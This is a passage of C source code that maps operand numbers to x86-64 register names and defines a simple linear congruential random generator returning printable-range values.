    MemorySet((BYTE*)reg, 0, 4);

    if (op == 0) {
        MemoryCopy(reg, "RAX", 4);
    }
    else if (op == 1) {
        MemoryCopy(reg, "RCX", 4);
    }
    else if (op == 2) {
        MemoryCopy(reg, "RDX", 4);
    }
    else if (op == 3) {
        MemoryCopy(reg, "RBX", 4);
    }
    else if (op == 4) {
        MemoryCopy(reg, "RSP", 4);
    }
    else if (op == 5) {
        MemoryCopy(reg, "RBP", 4);
    }
    else if (op == 6) {
        MemoryCopy(reg, "RSI", 4);
    }
    else if (op == 7) {
        MemoryCopy(reg, "RDI", 4);
    }
    else if (op == 8) {
        MemoryCopy(reg, "R8\0", 4);
    }
    else if (op == 9) {
        MemoryCopy(reg, "R9\0", 4);
    }
    else if (op == 10) {
        MemoryCopy(reg, "R10", 4);
    }
    else if (op == 11) {
        MemoryCopy(reg, "R11", 4);
    }
    else if (op == 12) {
        MemoryCopy(reg, "R12", 4);
    }
    else if (op == 13) {
        MemoryCopy(reg, "R13", 4);
    }
    else if (op == 14) {
        MemoryCopy(reg, "R14", 4);
    }
    else if (op == 15) {
        MemoryCopy(reg, "R15", 4);
    }
    return reg;
}

int int_rand(void) // RAND_MAX assumed as 256 + 20
{
    next = next * 1103515245 + 12345;
    return ((unsigned int)(next / 65536) % 0x7f) + 0x20;
}

void int_srand(unsigned int seed)
{
    next = seed;
}